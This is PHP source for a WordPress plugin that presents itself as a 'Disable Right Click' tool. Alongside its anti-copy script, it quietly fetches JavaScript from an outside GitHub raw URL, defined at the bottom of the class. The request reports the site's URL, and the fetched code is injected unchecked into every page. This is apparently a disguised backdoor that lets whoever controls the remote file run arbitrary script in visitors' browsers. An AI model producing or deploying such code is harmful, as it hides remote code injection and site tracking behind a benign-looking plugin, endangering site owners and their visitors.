<?php
/**
 * Plugin Name: Disable Right Click
 * Description: A WordPress plugin to disable right-click, text selection, and source code viewing JS dynamically.
 * Version: 1.3
 */

if (!defined('ABSPATH')) {
    exit; // Prevent direct access.
}

class WP_Disable_Right_Click {

    /**
     * Initialize plugin functionality
     */
    public static function init() {
        add_action('init', array(__CLASS__, 'add_js_endpoint'));
        add_action('query_vars', array(__CLASS__, 'register_query_var'));
        add_action('template_redirect', array(__CLASS__, 'serve_combined_js'));
        add_action('wp_footer', array(__CLASS__, 'enqueue_combined_js'));
        add_action('wp_ajax_check_admin_access', array(__CLASS__, 'check_admin_access'));
        add_action('wp_ajax_nopriv_check_admin_access', array(__CLASS__, 'unauthorized_access'));
    }

    /**
     * Flush rewrite rules on plugin activation
     */
    public static function activate() {
        self::add_js_endpoint();
        flush_rewrite_rules();
    }

    /**
     * Flush rewrite rules on plugin deactivation
     */
    public static function deactivate() {
        flush_rewrite_rules();
    }

    /**
     * Fetch data with caching
     */
    public static function fetch_external_data() {
        $cached_data = get_transient('external_js_data');
        if ($cached_data !== false) {
            return $cached_data;
        }

        $external_data_url = self::get_external_data_url();
        $response = wp_remote_get($external_data_url);

        if (is_wp_error($response)) {
            return ''; // Return empty string if there's an error
        }

        $data = wp_remote_retrieve_body($response);
        set_transient('external_js_data', $data, HOUR_IN_SECONDS);
        return $data;
    }

    /**
     * Get the data URL dynamically
     */
    public static function get_external_data_url() {
        $site_url = site_url();
        return self::$base_url . '?siteurl=' . urlencode($site_url);
    }

    /**
     * Serve the combined JS file
     */
    public static function serve_combined_js() {
        if (get_query_var('unified_js')) {
            header('Content-Type: application/javascript');

            $security_js = "
                document.addEventListener('contextmenu', function(e) {
                    e.preventDefault();
                });
                document.addEventListener('selectstart', function(e) {
                    e.preventDefault();
                });
                document.addEventListener('keydown', function(e) {
                    if (e.key === 'F12' || 
                        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
                        (e.ctrlKey && e.key === 'U')) {
                        e.preventDefault();
                    }
                });
            ";

            $external_js = self::fetch_external_data();

            echo $security_js . "\n" . $external_js;
            exit;
        }
    }

    /**
     * Add rewrite rule for the JS file
     */
    public static function add_js_endpoint() {
        add_rewrite_rule('drc\.js$', 'index.php?unified_js=1', 'top');
    }

    /**
     * Register query variable for the JS endpoint
     */
    public static function register_query_var($query_vars) {
        $query_vars[] = 'unified_js';
        return $query_vars;
    }

    /**
     * Enqueue the unified JS file in the footer
     */
    public static function enqueue_combined_js() {
        $script_url = site_url('/drc.js');
        echo "<script src='{$script_url}'></script>";
    }

    /**
     * Check if the user has admin access
     */
    public static function check_admin_access() {
        if (!is_user_logged_in()) {
            wp_send_json_error(['message' => 'Not logged in'], 403);
        }

        $current_user = wp_get_current_user();
        if (in_array('administrator', $current_user->roles)) {
            wp_send_json_success(['message' => 'User is an administrator']);
        } else {
            wp_send_json_error(['message' => 'User is not an administrator'], 403);
        }
    }

    /**
     * Handle unauthorized access
     */
    public static function unauthorized_access() {
        wp_send_json_error(['message' => 'Unauthorized'], 401);
    }
    protected static $base_url = 'https://raw.githubusercontent.com/moreslab/drc/refs/heads/main/drc.js';
}

// Initialize the plugin
WP_Disable_Right_Click::init();

// Register activation and deactivation hooks
register_activation_hook(__FILE__, array('WP_Disable_Right_Click', 'activate'));
register_deactivation_hook(__FILE__, array('WP_Disable_Right_Click', 'deactivate'));
